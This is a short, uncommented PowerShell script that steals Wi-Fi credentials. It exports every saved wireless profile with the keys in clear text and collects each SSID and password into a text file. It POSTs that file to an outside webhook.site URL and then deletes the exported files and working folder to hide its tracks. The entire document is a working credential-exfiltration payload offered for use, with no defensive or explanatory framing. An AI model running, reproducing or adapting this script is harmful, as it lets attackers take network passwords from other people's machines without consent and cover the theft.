$wd = "C:\WifiDir"
mkdir $wd
cd $wd

netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$row= "---------------------`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File wifipass.txt -Append -InputObject $row
}

Invoke-WebRequest -Uri https://webhook.site/10ae332b-7105-470a-bc0e-036044d457b4 -Method POST -InFile wifipass.txt -UseBasicParsing

rm *.xml
rm *.txt
cd ..
rm WifiDir
